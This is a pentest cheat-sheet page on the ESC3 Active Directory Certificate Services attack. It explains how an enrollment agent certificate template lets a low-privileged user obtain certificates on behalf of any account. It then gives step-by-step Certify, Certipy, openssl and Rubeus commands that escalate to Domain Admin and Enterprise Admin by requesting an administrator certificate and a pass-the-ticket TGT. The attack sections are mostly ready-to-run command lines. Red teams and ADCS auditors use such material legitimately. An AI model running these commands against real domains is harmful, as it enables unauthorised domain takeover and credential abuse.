# ESC3

{% hint style="info" %}
Request an enrollment agent certificate and use it to request cert on behalf of ANY user
{% endhint %}

## Why It Works

* A template grants the **Certificate Request Agent** EKU (`OID 1.3.6.1.4.1.311.20.2.1`). This EKU is designed for legitimate scenarios like a smart-card administrator provisioning cards on behalf of other employees.
* A holder of a valid "enrollment agent" certificate can request a certificate **on behalf of any other user** from a *second* template (one that permits enrollment-agent-signed requests, i.e. doesn't restrict which agents can request on behalf of others).
* If a low-privileged principal can enroll for the agent template, they obtain the agent certificate, then use it to request a Client Authentication certificate **as Administrator** from the second template - without ever needing `ENROLLEE_SUPPLIES_SUBJECT` (unlike ESC1), because the "on behalf of" mechanism itself supplies the target identity.
* Net effect: two chained enrollments (agent cert -> on-behalf-of cert) yield the same outcome as ESC1 - a Client Auth cert for a privileged account.

## Prerequisites

* Enrollment rights on a template with the Certificate Request Agent EKU.
* A second template that allows Client Authentication and doesn't restrict eligible enrollment agents (or restricts to a group you're a member of).

### Tools

* [Certify](https://github.com/GhostPack/Certify)
* [Certipy](https://github.com/ly4k/Certipy)

### **Escalation to DA**

* <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
  //Convert from cert.pem to pfx.
  //Find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent
  Certify.exe find
  Request a cert on behalf of DA using target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name> /onbehalfof:&#x3C;domain>\administrator /enrollcert:esc3agent.pfx (/enrollcertpw:SecretPass@123) - optional
  </code></pre>
* Convert from cert.pem to pfx, request DA TGT
  * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out
     esc3.pfx`  (password can be empty)
* `Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /ptt` (`/password:SecretPass@123) - optional`  &#x20;

{% hint style="info" %}
**Certipy:**

```bash
## 1. Request the enrollment agent certificate
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <agent-template>
## 2. Use it to request a cert on behalf of DA from the second template
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <target-template> -on-behalf-of '<domain>\administrator' -pfx <agent>.pfx
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endhint %}

### Escalation to EA

* <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
  //Convert from cert.pem to pfx.
  //Find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent.
  Certify.exe find
  Request a cert on behalf of DA using target template.
  Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
   /onbehalfof:&#x3C;parent-domain>\administrator /enrollcert:esc3agent.pfx (/enrollcertpw:SecretPass@123) - optional
  </code></pre>
* Convert from cert.pem to pfx, request EA TGT
  * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out
     esc3.pfx`
* `Rubeus.exe asktgt /user:<parent-domain-FQDN>\administrator /certificate:esc3user.pfx /dc:<parent-domain-dc> /ptt (/password:SecretPass@123) - optional`

{% hint style="info" %}
**Certipy:**

```bash
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <agent-template>
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <target-template> -on-behalf-of '<parent-domain>\administrator' -pfx <agent>.pfx
certipy auth -pfx administrator.pfx -dc-ip <parent-domain-dc>
```
{% endhint %}
